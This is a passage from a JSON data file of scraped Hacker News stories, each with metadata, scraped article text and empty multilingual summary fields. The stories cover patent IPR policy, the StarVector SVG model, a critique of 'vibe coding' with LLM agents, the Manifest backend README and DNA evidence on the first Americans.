owners.\nBy filing lawsuits in these troll-friendly courts, patent owners can game the system—forcing companies to pay up rather than risk millions in litigation costs.\nThe recent USPTO memo makes this problem even worse. Instead of stopping the abuse of discretionary denials, the USPTO is doubling down—undermining one of the most effective ways businesses, developers, and consumers can fight back against bad patents.\nCongress Created IPR to Protect the Public—Not Just Patent Owners\nThe USPTO doesn’t get to rewrite the law. Congress passed IPR to ensure that weak patents don’t become weapons for extortionary lawsuits. By reinforcing discretionary denials with minimal restrictions, and, as a result, blocking access to IPRs, the USPTO is directly undermining what Congress intended.\nLeaders at the USPTO should immediately revoke the February 28 memo. If they refuse, as we pointed out the last time IPR denials spiraled out of control, it’s time for Congress to step in and fix this. They must ensure that IPR remains a fast, affordable way to challenge bad patents—not just a tool for the largest corporations. Patent quality matters—because when bad patents stand, we all pay the price.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "99cbbb3c673748f1",
    "title": {
      "en": "StarVector: Generating Scalable Vector Graphics Code from Images and Text",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://starvector.github.io/",
    "score": 34,
    "by": "lnyan",
    "time": 1742610357,
    "content": "StarVector represents a breakthrough in Scalable Vector Graphics (SVG) generation, seamlessly integrating visual and textual inputs into a unified foundation SVG model. By reframing vectorization as a code generation task rather than a traditional image processing problem, StarVector transcends previous limitations. This paradigm shift enables the model to leverage the full richness of SVG syntax—including circles, polygons, text elements, and complex paths—without simplification. Our approach allows training on internet-scale data to capture the diverse spectrum of vector representations. At its core, the model employs a vision-language architecture (VLM), enabling unprecedented capabilities in generating complex SVG elements. Complemented by SVG-Stack—our extensive dataset—and SVG-Bench—our comprehensive evaluation framework—StarVector establishes a new paradigm for high-quality vector graphics generation.\n\n              Key Capabilities\n\n                01\n\n                  Advanced Multimodal Architecture\n                  StarVector's multimodal architecture processes both visual and textual information with remarkable precision, enabling sophisticated image vectorization and text-guided SVG creation that captures fine details and structural relationships. The image encoder and language decoder work together to understand the semantics of an image in pixel space, recognizing primitive shapes, hierarchies, and layers to produce compact and semantically meaningful SVG primitive outputs.\n\n                02\n\n                  Unparalleled Complexity Handling\n                  Where traditional algorithms falter, StarVector excels—effortlessly recognizing and generating intricate SVG elements including text, complex paths, and various primitives directly from images. The model intelligently identifies geometric shapes, connectivity patterns, and structural elements to produce professional-quality diagrams and icons.\n\n                03\n\n                  Robust Data Foundation\n                  Built upon SVG-Stack—our meticulously curated dataset of over 2 million SVG samples—and evaluated through SVG-Bench, StarVector benefits from diverse, high-quality training examples that ensure consistent performance across various graphic styles and complexities.\n\n                04\n\n                  Leading-Edge Performance\n                  StarVector significantly outperforms existing methods in both text-to-SVG and image-to-SVG generation tasks, demonstrating a substantial leap forward in vectorization quality while remaining fully accessible to the research community as an open-source resource.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2f1b7353f0c9203c",
    "title": {
      "en": "A Dyson Swarm Made of Solar Panels Would Make Earth Uninhabitable",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.universetoday.com/articles/a-dyson-swarm-made-of-solar-panels-would-make-earth-uninhabitable",
    "score": 15,
    "by": "nobody9999",
    "time": 1742679465,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "15dd50f604234d73",
    "title": {
      "en": "Wheel Reinventor’s Principles (2024)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://tobloef.com/blog/wheel-reinventors-principles/",
    "score": 208,
    "by": "TobLoef",
    "time": 1742559405,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2c164bc012f84125",
    "title": {
      "en": "France hits hydrogen jackpot: largest reserve valued $92B found",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://interestingengineering.com/energy/france-worlds-largest-hydrogen-deposit",
    "score": 52,
    "by": "j_maffe",
    "time": 1742648831,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c13bf0830405a1b3",
    "title": {
      "en": "“Vibe Coding” vs. Reality",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://cendyne.dev/posts/2025-03-19-vibe-coding-vs-reality.html",
    "score": 183,
    "by": "birdculture",
    "time": 1742675751,
    "content": "\"Vibe Coding\" vs RealityPublished Mar 19, 2025 - 11 min read - Text OnlyTable of contents\"Vibe Coding\" vs RealityWorking around the problemConclusionThere's a trend on social media where many repeat Andrej Karpathy's words (archived): \"give in to the vibes, embrace exponentials, and forget that the code even exists.\" This belief — like many flawed takes humanity holds — comes from laziness, inexperience, and self-deluding imagination. It is called \"Vibe Coding.\"\"Embrace the exponentials\" sounds like it came from an NFT junkie.Like the NFT crowd, there is a bubble of unreality they cling to justifying their perception of the world.Producing software is now more accessible as newer tools allow people to describe what they want in a natural language to a large language model (LLM). This idea is catching on because LLM agents are now accessible to anyone willing to subscribe to vendors like Cursor, GitHub, Windsurf, and others. These editors have an \"agent\" option where users can request something and in response changes are made to the appropriate files, rather than only the file currently in focus. Over time, the agent will request to run commands to run tests or even run scripts it previously wrote to the file system, much as you would if you were solving the problem.In 2022, folks could copy code into ChatGPT and ask questions or for rewrites.In 2023, folks could ask it to review and edit a single file with an IDE integration like Copilot.In 2024 and 2025, folks could ask it to solve a specific problem in the project and have it find out what files to edit, edit them, then verify its own work, and correct any mistakes it made with feedback from linting errors and unit tests.With LLM agents having so much capability, people can delegate the idea of refining their imprecise ideas to a precise implementation elaborated by an LLM through \"Vibe Coding.\"Justine Moore@venturetwins@twitter.com@a16z @stuffyokodraws First - what is vibe coding?A concise definition from @stuffyokodraws, and then an exploration of how technical vs. non-technical users approach these tools. Thursday, Mar 13, 2025If you open a blank folder and tell it to set up an initial project, it can do a lot at once. With no rules, no patterns to mimic, and no constraints, it can produce something that feels more tailored for you in minutes than npx create-react-app ever could.With a simple instruction like \"I want to create a website for my ski resort\" and about ten minutes of having it massage errors of its own making, I can have just that.These leaps of progress are what fuels the \"Vibe Coding\" idea. To go from nothing to something shareable and personal sounds incredible.This moment provided a thrill I hadn't experienced in a long time when coding. However, this excitement drained quickly the further I got from a blank canvas.Agents, as a concept, aren’t new. Google IO made up buzzwords like \"agentic era\" (archived) to describe this concept. It has been realized through open technologies like AutoGPT, XAgent, and more recently by Anthropic with the Model Context Protocol (MCP).When the model can interact with more than just a person who proxies their outputs into different domains, it is autonomous. If it can perform searches on the web or in a codebase, it can enrich its own context with the information it needs to fulfill the current request. Further, when it can commit outputs and then gain immediate and automatic feedback on those outputs, it can refine its solution without a person intervening.There are actions that do prompt the user for consent before proceeding, such as running commands in the console or deleting files. This consent can be pre approved with a mode called \"YOLO.\"A mode for \"You Only Live Once\"!? Really?You can witness this autonomy for yourself today in Cursor.The agent concept has merit and today can deliver proofs of concept that VC firms like Y-Combinator will invest in — proofs of concept that are trash by unskilled founders hoping to win the lottery while living the life of leisure.Sebastian@sebastianvolkis@twitter.comI’ve cracked vibe coding, TrendFeed has almost hit its first 10k month, and Ai built the entire thingIm just sitting here sipping coffee, coding with Ai + MCPAlso more time to shitpost on X haha Thursday, Mar 13, 2025The optimal technical founder for a VC is not the 10x engineer. It is someone who'll deliver enough of a product to test its fitness in the market and then succeed in raising more investment money. Their execution on their vision and hiring prowess is more important than their technical skillset.The execution of agents today is over-hyped and does not hold up to the needs of any functioning businesses which need experts to develop and maintain their technical capabilities instead of single points of failure on the internet.Ian Nuttall@iannuttall@twitter.combabe, come to bedi can't, i'm vibe coding Thursday, Mar 13, 2025These models are trained on average sloppy code, wrong answers on Stack Overflow, and the junk that ends up on Quora. Despite the power and capability Claude 3.7 Sonnet has in small contexts, when faced with even a small codebase it makes constant silly mistakes that no normal developer would repeat and continue to repeat every hour of its operation.Specific details on the mistakes, feel free to skipRegularly clones TypeScript interfaces instead of exporting the original and importing it.Reinvents components all the time with the same structure without searching the code base for an existing copy of that component.Writes trusted server side logic on the client side, using RPC calls to update the database.As a feature develops, it prioritizes maintaining previous mistakes instead of re-evaluating its design, even when told to do so. You have to say the previous implementation is outright unusable for it to replace its design.Cursor has some sort of \"concise mode\" (archived) that they'll turn on when there is high load where the model will still be rated at the normal price but behaves in a useless manner. This mode will omit details, drop important findings, and corrupt the output that is being produced.Cannot be trusted to produce unit tests with decent coverage.Will often break the project's code to fit a unit test rather than fix the unit test when told to do so.When told to fix styles with precise details, it will alter the wrong component entirely.When told specifically where there are many duplicated components and instructed to refactor, will only refactor the first instance of that component in the file instead of all instances in all files.When told to refactor code, fails to search for the breaks it caused even when told to do so.Will merrily produce files over 1000 lines which exceed its context window over time, even when told to refactor early on.Will regularly erase entire route handlers if not bound to the file hierarchy.As currently designed, these models cannot learn new information. They cannot do better than the dataset they were created with. Instead their capability is realized by how effective they can process tokens entering their context window.If you ask Claude 3.7 Sonnet to develop a runtime schema for validating some domain specific language and then ask it to refactor the file — because it is too large for its context window to continue — it will degrade and output incoherent nonsense before finishing its work.It did not type \"I've\" correctly and conjoined the words \"schema\" and \"refactored\" into one.leo@leojr94_@twitter.commy saas was built with Cursor, zero hand written codeAI is no longer just an assistant, it’s also the builderNow, you can continue to whine about it or start building.P.S. Yes, people pay for it Saturday, Mar 15, 2025You cannot ask these tools today to develop a performant React application. You cannot ask these tools to implement a secure user registration flow. It will choose to execute functions like is user registered on the client instead of the server.Others are learning this the hard way too.leo@leojr94_@twitter.comguys, i'm under attackever since I started to share how I built my SaaS using Cursorrandom thing are happening, maxed out usage on api keys, people bypassing the subscription, creating random shit on dbas you know, I'm not technical so this is taking me longer that usual to figure outfor now, I will stop sharing what I do publicly on Xthere are just some weird ppl out there Monday, Mar 17, 2025Without expert intervention, the best these tools can do today is produce a somewhat functional mockup, where every future change beyond that risks destroying existing functionality.I cannot — and would not — trust a team member who vibe codes in a production application. The constant negligence I observe when \"Vibe Coding\" is atrocious and unacceptable to a customer base of any size.No available model demonstrates consistent and necessary attention to detail needed for a production environment. They are not yet equipped or designed to transform information involving multiple contexts inherent to producing a digital product.These tools are optimized to produce solutions that fit in a single screen of markdown and are now being asked to do far more than they were trained for. As the context window overflows and the model degrades, it will fail to even format MCP calls correctly and upon reaching this point of no return, produces a log that comes across as being tortured. Like a robot losing a limb, it will try and try again to walk only to fall down until the editor pauses the conversation to save on resources.Working around the problemA modern \"Twitch plays Pokémon\" is going on right now: Claude Plays Pokémon. It mitigates this context window problem by starting a new context with seeded information provided by its previous incarnation in the form of many Markdown files, which it can then read as if new and search via MCP during its playthrough.Anthropic@AnthropicAI@twitter.comSo, what makes this possible? Claude was given a knowledge base to store notes, vision to see the screen, and function calls which allow it to simulate button presses and navigate the game.Together, they allow Claude to sustain gameplay with tens of thousands of interactions. Tuesday, Feb 25, 2025Even so, it can make bad assumptions and spend 43 hours intentionally blacking out over and over in Mt. Moon (an in-game route between story locations) making no effective progress towards achieving its next goal because by the time it could second guess itself, its context window is no longer fit to continue.It did escape and progress, but only after the critic instance of the model suggested its assumption was incorrect.After a context cleanup completes, which takes about five minutes (the video above is edited to the meaningful moments), the model proceeds to make the same mistakes its prior incarnation did. The notes it wrote are not meaningfully interpreted in context, I find the same happens too with the Cursor rules I write.While increasing the length of the context window will improve some immediate experiences, this is a problem of scale that needs a different solution for agents to be more effective and, perhaps, move \"Vibe Coding\" closer to reality.Would a formalized bullet journal over MCP help a model be more complete in delivering more reliable results?As long as the model correctly checks it before concluding its work is complete!A bullet journal may be one of many tools that improve the reliability of the models we have today.The next issue is that these models cannot ingest information from multiple concurrent real-time sources. In one terminal we may be running the server and in another some end-to-end tests. Both of these terminals were created at the agent's request. It either ignores or is not fed the stack trace logged by the server in the first terminal as it watches the output of the end-to-end tests fail and retry, fail and retry.For agents to have the impact promised by the hype, LLMs need a robust mechanism to mimic the development of short and long term memory without fine-tuning the memories into the model.Furthermore, for agents to contribute to a team, there must be a way to develop long-term memories bound to the organization and its products that seamlessly merge with and reconcile with memories personal to each team member.And lastly, these memories have to be portable. As models improve and are integrated into our tools, domain specific memories must be usable by the next generation of large language models.Conclusion\"Vibe Coding\" might get you 80% the way to a functioning concept. But to produce something reliable, secure, and worth spending money on, you’ll need experienced humans to do the hard work not possible with today’s models.Agents do demonstrate enough capability that LinkedIn CEO influencers confidently spread the unreality that we can replace jobs with \"agentic AI.\"Agents do enable skilled people to create more independently than they ever have. For the time being, it will not replace those that can solve the hard problems that only experience and intuition can identify. Like other no-code solutions, agents do give the less skilled more capability than they had the day before. Until they develop their own competent skill set, \"Vibe Coders\" will not be able to release production quality software in this world, no matter how exponential the agent is over their own inferior skill set.Keep an eye on how LLM agents develop and improve. For now, they are worth evaluating and discussing, but are not ready for us to delegate the precise task of creating reliable, secure, and scalable software that powers our society. \"Vibe Coding\" will not create the next big thing in 2025.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2b17c3b7b0af698f",
    "title": {
      "en": "Raspberry Pi: rpi-image-gen",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.raspberrypi.com/news/introducing-rpi-image-gen-build-highly-customised-raspberry-pi-software-images/",
    "score": 12,
    "by": "aduffy",
    "time": 1742675487,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "4ef86df9914d8ed3",
    "title": {
      "en": "Liberapay",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://en.liberapay.com/",
    "score": 340,
    "by": "nanna",
    "time": 1742300472,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e44736f087491b6a",
    "title": {
      "en": "Manifest: A 1-file micro-back end",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/mnfst/manifest",
    "score": 94,
    "by": "andrewshadura",
    "time": 1742292941,
    "content": "🚀 Featured on HackerNews – join the momentum & give us a ⭐ if you like it!\n\nThe 1-file micro-backend\n\nname: Pokemon app 🐣\n\nentities:\n  Pokemon 🐉:\n    properties:\n      - name\n      - {\n          name: type,\n          type: choice,\n          options: { values: [Fire, Water, Grass, Electric] }\n        }\n      - { name: level, type: number }\n    belongsTo:\n      - Trainer\n\n  Trainer 🧑‍🎤:\n    properties:\n      - name\n      - { name: isChampion, type: boolean }\n\nWhy Manifest?\n80% of websites and apps only use the most basic backend features. Using over-engineered solutions lead to unnecessary costs and complexity.\nManifest keeps it simple, delivering only the essential backend features and smoothly integrating in your project like any other file in your codebase.\nUse cases\nManifest fits great in those type of projects:\n\n🛠️ Rapid prototyping: POCs and MVPs\n🧩 Micro services: notification, payment, logging, file services...\n🏭 CRUD-heavy apps: mobile apps, directories, PIMs, E-shops\n🌐 Headless CMS: dynamic corporate websites, portfolios, blogs...\n\nKey features\nAuth | Validation | Storage | Image resizing | Admin panel | Dynamic endpoints |\nREST API | JS SDK | Webhooks\nGetting started\nSimply run this terminal command to add Manifest locally:\nnpx add-manifest@latest\n\nNoteManifest is currently in BETA, use it at your own risk. It is stable enough to power small projects, prototypes and MVPs but we do not recommend to use it on critical platforms.\n\nCommunity & Resources\n\nRead the Docs to get started\nChat with us on our Discord\nReport bugs on Github issues\nSuggest new features on Github Discussions\n\nWant to help Manifest grow? 💗\nHere is a few small things you can do:\n\nStar the Manifest repository (this one)\nGive us your feedback on Discord\nSponsor Manifest through OpenCollective\n\nContributors\nWe welcome contributions to Manifest, Please see our Contributing Guidelines to get started and join the journey.\nThanks to our wonderful contributors!\n\nSponsors\nManifest is an MIT-licensed open-source project. If you find it useful and want to support its development, consider becoming a sponsor.\nSponsors\n\nBacked by\n\nPartners\n\nThis project is tested with BrowserStack",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "abe61af7f266c42a",
    "title": {
      "en": "DNA evidence says first Americans came from Asia",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://factsanddetails.com/world/cat56/sub361/entry-8944.html",
    "score": 76,
    "by": "axiologist",
    "time": 1742508868,
    "content": "DNA EVIDENCE SAYS FIRST AMERICANS CAME FROM ASIA\n\n\tBeringia in the Ice Age\n\nNatives Americans are believed to have descended from Asian people who arrived in North America via the Bering Strait. The DNA of ancient American bog people is closer to the Japanese than Americans.\n\nGlenn Hodges wrote in National Geographic: “In recent years geneticists have compared the DNA of modern Native Americans with that of other populations around the world and concluded that the ancestors of Native Americans were Asians who separated from other Asian populations and remained isolated for about 10,000 years, based on mutation rates in human DNA. During that time they developed unique genetic signatures that only Native Americans currently possess. [Source: Glenn Hodges, National Geographic, January 2015 /~]\n\n“These genetic markers have been found not only in the DNA recovered from Naia’s skeleton” from Hoyo Negro, Mexico “ but also in the remains of a child buried some 12,600 years ago in western Montana, on a piece of land now called the Anzick site.” In 2014 “Danish geneticist Eske Willerslev reported that an analysis of the child’s remains had yielded, for the first time, a full Paleo-American genome. “Now we’ve got two specimens, Anzick and Hoyo Negro, both from a common ancestor who came from Asia,” Waters says. “And like Hoyo Negro, the Anzick genome unquestionably shows that Paleo-Americans are genetically related to native peoples.” Though some critics point out that two individuals are too\nsmall a sample to draw definitive conclusions, there’s strong consensus on the Asian ancestry of the first Americans.” /~\\\n\n RELATED ARTICLES:\n EARLIEST EVIDENCE OF HUMANS TO AMERICA  factsanddetails.com ;\n WHEN AND HOW THE FIRST HUMANS CAME TO AMERICA: THEORIES AND EVIDENCE  factsanddetails.com ;\n MIGRATION ROUTE OF THE FIRST HUMANS IN AMERICA  factsanddetails.com ;\n SINGLE WAVE VS MULTIPLE PULSE THEORY AND MIGRATION OF EARLY PEOPLE TO AMERICA  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN WHAT IS NOW ALASKA AND CANADA  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN WHAT IS NOW THE CONTINENTAL U.S.  factsanddetails.com ;\n WHITE SANDS 23,000-21,000 YEAR-OLD HUMAN FOOTPRINTS  factsanddetails.com ;\n CLOVIS PEOPLE: SITES, POINTS, PRE-CLOVIS, MAMMOTHS  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN SOUTH AMERICA  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN SOUTHERN SOUTH AMERICA  factsanddetails.com ;\n FIRST HUMANS AND SETTLEMENTS IN THE AMAZON  factsanddetails.com ;\n SOLUTREAN HYPOTHESIS  factsanddetails.com\n\n  RECOMMENDED BOOKS:\n “Origin: A Genetic History of the Americas” By Jennifer Raff, an associate professor of anthropology at the University of Kansas (Twelve, 2022);   Amazon.com;\n “First Peoples in a New World: Populating Ice Age America” by David J. Meltzer, an archaeologist and professor of prehistory in the Department of Anthropology at Southern Methodist University in Dallas, (Cambridge University Press, 2021);  Amazon.com;\n “The Indigenous Paleolithic of the Western Hemisphere” by Paulette F. C. Steeves (2023)  Amazon.com;\n “First Migrants: Ancient Migration in Global Perspective” by Peter Bellwood  Amazon.com;\n“Ancestral DNA, Human Origins, and Migrations” by Rene J. Herrera (2018)  Amazon.com;\n“Who We Are and How We Got Here: Ancient DNA and the New Science of the Human Past” by David Reich (2019)  Amazon.com;\n“Our Human Story: Where We Come From and How We Evolved” By Louise Humphrey and Chris Stringer, (2018)  Amazon.com;\n\"The Settlement of the Americas: A New Prehistory\" by Thomas D. Dillehay ( Basic Books, 2000 Dated)  Amazon.com;\n”Strangers in a New Land: What Archaeology Reveals About the First Americans”\nby J. M. Adovasio, David Pedler (2016)  Amazon.com;\n “Paleoindian Mammoth and Mastodon Kill Sites of North America by Jason Pentrail (2021)  Amazon.com;\n “Clovis The First Americans?: by F. Scott Crawford (2012)\n Amazon.com;\n “Across Atlantic Ice: The Origin of America's Clovis Culture”\nby Dennis J. J. Stanford, Bruce A. Bradley, Michael Collins  Amazon.com;\n “From Kostenki to Clovis: Upper Paleolithic—Paleo-Indian Adaptations (Interdisciplinary Contributions to Archaeology) by Olga Soffer (1993)  Amazon.com;\n\nGenetic Model of the First Americans\n\nLaura Geggel wrote in Live Science: Geneticists studying the first Americans tend to paint a more consistent picture than archaeologists do, mainly because they're using the same human remains and genetic datasets. Genetic analyses have found that Ancient North Siberians and a group of East Asians paired up around 20,000 to 23,000 years ago, Jennifer Raff, an associate professor of anthropology at the University of Kansas, told Live Science. Soon after, the population split into two genetically distinct groups: one that stayed in Siberia, and another, the basal American branch, which emerged around 20,000 to 21,000 years ago. Genetic data suggest the descendants of this basal American branch crossed the Bering Land Bridge and became the first Americans. [Source: Laura Geggel, Live Science, October 9, 2023]\n\nThe basal American branch then split into three groups: unsampled population A (UPopA), a mysterious \"genetic\" ghost that has \"only been detected indirectly from the genomes\" of the Mixe, of what is now Mexico, Raff said; Ancient Beringians, who have no known living descendants; and Ancestral Native Americans (ANA), whose descendants live on today.\n\nAll three of these groups ultimately made it to North America, but their diverging genetics suggests that they crossed in separate movements, Meltzer and Willerslev wrote in the review. Some didn't make it very far; The Ancient Beringians entered Alaska but never made it south of the continental ice sheets. The last known Ancient Beringian, known as the \"Trail Creek individual,\" died around 9,000 years ago in Alaska.\n\nMeanwhile, the ANA lineage underwent several splits, suggesting that these people settled in different areas of North America as they had limited gene flow between them, Raff said. There was one split between 21,000 and 16,000 years ago and then a second one around 15,700 years ago. During this second split, the Northern Native Americans — whose living descendants include speakers of the Algonquian, Salishan, Tsimshian and Na-Dené language groupings — separated from the Southern Native Americans (SNA), who spread southward and whose descendants include the Clovis, Raff said. Every known living and deceased Indigenous \"individual south of Canada belongs to SNA,\" Raff said.\n\nDNA Studies Related to the First Americans\n\nOne study revealed that the first Native American group to settle in the Americas had just about 250 people in it. According to Live Science: To make the finding, researchers looked at the DNA of people from Native American groups in Central and South America, different Siberian groups, and people from China. Because genetic divergence (for instance, between Native Americans and Siberians) increases with time, the researchers were able to plug the DNA data into a computer model and work backward to determine the size of the original group. [Source:  Laura Geggel, Live Science, December 25, 2018]\n\nEske Willerslev of the University of Cambridge and the Center for GeoGenetics at the Globe Institute at the University of Copenhagen sequenced the first ancient human genome in 2010 and later sequenced numerous genomes in an effort to get a picture of the first Americans, including a 12,400-year-old boy from Montana, 11,500-year-old infants at Alaska’s Upward Sun River site and the skeletal DNA of a boy whose 24,000-year-old remains were found at the village of Malta, near Russia’s Lake Baikal. [Source: Fen Montaigne, Smithsonian magazine, January-February 2020]\n\nFen Montaigne wrote in Smithsonian magazine: “According to Willerslev, sophisticated genomic analyses of ancient human remains — which can determine when populations merged, split or were isolated — show that the forebears of Native Americans became isolated from other Asian groups around 23,000 years ago. After that period of genetic separation, “the most parsimonious explanation,” he says, is that the first Americans migrated into Alaska well before 15,000 years ago, and possibly more than 20,000 years ago. Willerslev has concluded that “there was a long period of gene flow” between the Upward Sun River people and other Beringians from 23,000 to 20,000 years ago. “There was basically an exchange between the populations across eastern and western Beringia,” Willerslev said in a phone interview from Copenhagen. “So you had these groups hanging around Beringia and they are to some degree isolated — but not completely isolated — from each other. You had those groups up there, on both sides of the Bering Land Bridge, around 20,000 years ago. I think that is very likely.”\n\nChinese researchers Feng Zhang, Bing Su, Ya-ping Zhang and Li Jin have done studies based on Mitochondrial DNA (mtDNA), circular chromosomes found inside cellmitochondria that is passed down on along the female line.  They wrote in an article published by the Royal Society: Among Native Americans: “There are three linguistically identified groups of population: Amerind, Eskimo-Aleut and Na-Dene. mtDNA haplogroups of Native America include four Asian haplogroups (A, B, C and D) and one European haplogroup studied Amerind populations and showed that the sequence diversity of haplogroup B is much lower than those of haplogroups A, C and D. Furthermore, haplogroup B is absent in Siberia, while A, C and D are prevalent. These two observations imply that the Amerind linguistic group might have been derived from two migrations. [Source: “Genetic studies of human diversity in East Asia” by 1) Feng Zhang, Institute of Genetics, School of Life Sciences, Fudan University, 2) Bing Su, Laboratory of Cellular and Molecular Evolution, Kunming Institute of Zoology, 3) Ya-ping Zhang, Laboratory for Conservation and Utilization of Bio-resource, Yunnan University and 4) Li Jin, Institute of Genetics, School of Life Sciences, Fudan University. Author for correspondence (ljin007@gmail.com),  2007 The Royal Society ***]\n\nLell et al. (2002) analysed 12 Y-SNPs in 549 individuals from Siberia and the Americas. Three major Y lineages of Native American populations have been found: M3 (66 percent), M45 (25 percent) and M130 (5 percent). M3, also known as DYS119 (Underhill et al. 1996), was confined to the Chukoka peninsula in Siberia. M45 was divided into two subgroups; one subgroup (M45a) is found throughout the Americas, and another (M45b) is prevalent in North and Central America. These two sub-haplogroups have different distribution patterns in Siberia (M45a in middle Siberia and M45b in eastern Siberia). The C-M130 haplogroup has a similar distribution to that of M45b in Siberia and in North America. They hypothesized that there were two independent migrations into America from Siberia, which is consistent with the mtDNA evidence (Wallace et al. 1985). M242 is a polymorphism, which was introduced after M74 (arising in Asia) but before M3 (arising in America) in the phylogeny of the human Y chromosome (Underhill et al. 1996, 2000), and can be used to date the entry into the Americas. Based on the diversity of 15 Y-STRs in 69 Eurasian M242-T samples, the time of first entry into the Americas was estimated to be close to 15 000–18 000 years BP (Seielstad et al. 2003).\n\nDid the First Americans and Japanese Come from China?\n\nA DNA study published in May 2023 in Cell Reports revealed that some of the first arrivals in America  came from China during two distinct migrations: the first during the last ice age, and the second shortly after. \"Our findings indicate that besides the previously indicated ancestral sources of Native Americans in Siberia, the northern coastal China also served as a genetic reservoir contributing to the gene pool,\" Yu-Chun Li, one of the report authors, told AFP. [Source:  Issam Ahmed, AFP, May 10, 2023]\n\nAFP reported: Li added that during the second migration, the same lineage of people settled in Japan, which could help explain similarities in prehistoric arrowheads and spears found in the Americas, China and Japan. It was once believed that ancient Siberians, who crossed over a land bridge that existed in the Bering Strait linking modern Russia and Alaska, were the sole ancestors of Native Americans. More recent research, from the late 2000s onwards, has signaled more diverse sources from Asia could be connected to an ancient lineage responsible for founding populations across the Americas, including Bolivia, Brazil, Chile, Ecuador, Mexico and California. Known as D4h, this lineage is found in mitochondrial DNA, which is inherited only from mothers and is used to trace maternal ancestry.\n\nThe team from the Kunming Institute of Zoology embarked on a ten-year hunt for D4h. Charles Q. Choi wrote in  Live Science: The researchers analyzed more than 100,000 contemporary and 15,000 ancient DNA samples from across Eurasia. D4h is a rare mitochondrial DNA lineage which is currently found in only about 1 in 200 people worldwide. \"This genetic type had only been sporadically reported in different studies,\" study lead author Yu-Chun Li, a molecular anthropologist at the Kunming Institute of Zoology in China, told Live Science. \"Therefore, this female lineage, as well as its origin and dispersal history — especially its dispersal into the Americas — gained little attention until now.\" Previous research found that one branch of D4h, known as D4h3a, was seen in Indigenous Americans, while another offshoot named D4h3b was detected in China and Thailand. This suggested that ancient members of the D4h lineage might help bridge Asia and the Americas.\"The most difficult work was to collect as many samples belonging to D4h as we could,\" study senior author Qing-Peng Kong, an evolutionary geneticist at the Kunming Institute of Zoology, told Live Science. [Source:  Charles Q. Choi, Live Science May 10, 2023]\n\nThe Kunming team eventually landed on 216 contemporary and 39 ancient individuals who came from the ancient lineage.\nBy analyzing the mutations that had accrued over time, looking at the samples' geographic locations and using carbon dating, they were able to reconstruct the D4h lineage's origins and expansion history. The results revealed two migration events. The first was between 19,500 and 26,000 years ago during the Last Glacial Maximum, when ice sheet coverage was at its greatest and climate conditions in northern China were likely inhospitable.\n\nThe second occurred during the melting period, between 19,000 and 11,500 years ago. Increasing human populations during this period might have triggered migrations. In both cases, the scientists think the travelers were seafarers who docked in America and traveled along the Pacific coast by boats. This is because a grassy passageway between two ice sheets in modern Canada, known as the  \"inland ice-free corridor,\" was not yet opened.In the second migration, a subgroup branched out from northern coastal China to Japan, contributing to the Japanese people, especially the indigenous Ainu, the study said, a finding that chimes with archeological similarities between ancient people in the Americas, China and Japan.\n\nLi said a strength of the study was the number of samples they discovered, and complementary evidence from Y chromosomal DNA showing male ancestors of Native Americans lived in northern China at the same time as the female ancestors, made them confident of their findings.Loren Davis, an archaeologist at Oregon State University in Corvallis who did not take part in this research, told Live Science while the new study is exciting, it's just \"another piece of the puzzle,\" on how and when ice age humans first populated the Americas, Davis said. For instance, the researchers stressed that while these new findings suggest this single northern Chinese lineage may have contributed to Indigenous American ancestry, \"it does not represent the whole history of all Native Americans,\" Li said. \"Investigating other lineages showing genetic connections between Asia and the Americas will help obtain the whole picture of the history of Native Americans.\"\n\nMigration Patterns Deduced from Blood Types and North America and Siberian Languages\n\nGeneticists believe that early Americans were composed of three separate groups that arrived in America at different times from different places: 1) the Amerind, the dominate group in North and South America, possess only type O blood; 2) the Na-Dene, who live in clusters in Alaska, Canada and part of the U.S. Southwest, have mostly O but a little A blood; and 3) the Alaskan and Canadian Inuit (Eskimo) have A, B, AB and O blood group patterns which parallel other groups found in the rest of the world.\n\nJoseph Stromberg wrote in smithsonian.com: “A pair of linguistics researchers, Mark Sicoli and Gary Holton, recently analyzed languages from North American Na-Dene family (traditionally spoken in Alaska, Canada and parts of the present-day U.S.) and the Asian Yeneseian family (spoken thousands of miles away, in central Siberia), using similarities and differences between the languages to construct a language family tree. As they note in an article published today in PLOS ONE, they found that the two language families are indeed related—and both appear to descend from an ancestral language that can be traced to the Beringia region. Both Siberia and North America, it seems, were settled by the descendants of a community that lived in Beringia for some time. In other words, Sicoli says, “this makes it look like Beringia wasn’t simply a bridge, but actually a homeland—a refuge, where people could build a life.”[Source:  Joseph Stromberg, smithsonian.com, March 12, 2014 ^]\n\n“Sicoli began looking into the relationships between languages to model migration in the region several years ago, when he was with Holton at the University of Alaska (Sicoli is now at Georgetown University). The relationship between Yenesian and Na-Dene languages—which would theoretically serve as proof that Native Americans’ ancestors had migrated from Asia—was proposed as far back as 1923, by Italian linguist Alfredo Trombetti, but the first rigorous research to prove the link was only conducted over the past decade or so. ^\n\n“Sicoli and Holton sought to go a step further: They wanted to not only show the two groups were related, but analyze the similarities and differences between languages in the two families to paint a geographic picture of this ancient migration.  To do so, they relied upon software programs that 